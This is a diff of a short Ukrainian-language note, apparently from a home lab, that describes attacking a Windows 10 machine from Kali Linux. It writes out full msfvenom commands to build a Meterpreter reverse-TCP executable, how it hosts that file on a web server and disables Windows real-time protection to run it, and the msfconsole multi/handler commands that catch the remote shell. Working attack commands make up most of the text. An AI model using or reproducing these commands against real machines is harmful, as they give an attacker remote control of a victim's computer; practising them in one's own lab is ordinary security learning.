@@ -1,3 +1,5 @@
 жертва Windows 10,атакую з Kali 
-на Kali підняв веб сервер,згенерував payload вірус -(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -a x64 -o /home/andryxa/Desktop/virus.exe),дав права - (chmod 777 virus.exe) і закинув на сервер - (cp /home/andryxa/Desktop/virus.exe /var/www/html)
-на Windows відключив захист в реальному часі, успішно завантажив і запустив вірус.Після цього на Kali запускаю msfconsole і такі команди - (use exploit/multi/handler),(set PAYLOAD windows/x64/meterpreter/reverse_tcp),(set LHOST 192.168.1.5),(set LPORT 4444),і run 
+на Kali підняв веб сервер,згенерував payload вірус -(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -a x64 -o /home/andryxa/Desktop/virus.exe)
+дав права - (chmod 777 virus.exe) і закинув на сервер - (cp /home/andryxa/Desktop/virus.exe /var/www/html)
+на Windows відключив захист в реальному часі, успішно завантажив і запустив вірус
+Після цього на Kali запускаю msfconsole і такі команди - (use exploit/multi/handler),(set PAYLOAD windows/x64/meterpreter/reverse_tcp),(set LHOST 192.168.1.5),(set LPORT 4444),і run 
